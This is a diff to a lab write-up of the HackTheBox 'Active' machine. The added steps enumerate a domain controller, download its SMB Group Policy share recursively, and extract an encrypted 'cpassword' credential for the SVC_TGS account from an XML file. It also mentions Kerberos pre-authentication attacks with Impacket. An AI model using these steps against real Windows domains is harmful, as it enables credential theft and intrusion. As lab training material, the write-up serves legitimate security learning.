@@ -58,6 +58,11 @@ Nmap done: 1 IP address (1 host up) scanned in 114.87 seconds
 ```
 From the nmap scan, we notice that the host is a Domain Controller since it is running LDAP. We also know the OS version is Windows Server 2008 and the domain is active.htb. 
 
+We add the domain name to our /etc/hosts file:
+```
+10.10.10.100 active.htb
+```
+
 Like we did in HTB-Forest, we can try using Impacket's GetNPUsers.py to see if there are any domain users who do not have Kerberos preauthentication enabled which would allow us to access their TGT/hashed password. 
 
 ```
@@ -99,4 +104,30 @@ smb: \> ls
 		5217023 blocks of size 4096. 278565 blocks available
 smb: \> 
 ```
+After changing directory to active.htb, we find many files, therefore we download them all recursively with 3 smb commands:
+```
+smb: \> RECURSE ON 
+smb: \> PROMPT OFF
+smb: \> mget *
+
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.7 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (12.5 KiloBytes/sec) (average 2.9 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (3.1 KiloBytes/sec) (average 3.0 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (7.1 KiloBytes/sec) (average 3.4 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (30.3 KiloBytes/sec) (average 5.7 KiloBytes/sec)
+```
+Once we look through all the files, we see a Guests.xml file:
+```
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+```
+with username active.htb\SVC_TGS
+and password that looks encrypted:
+```
+edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+```
+
 
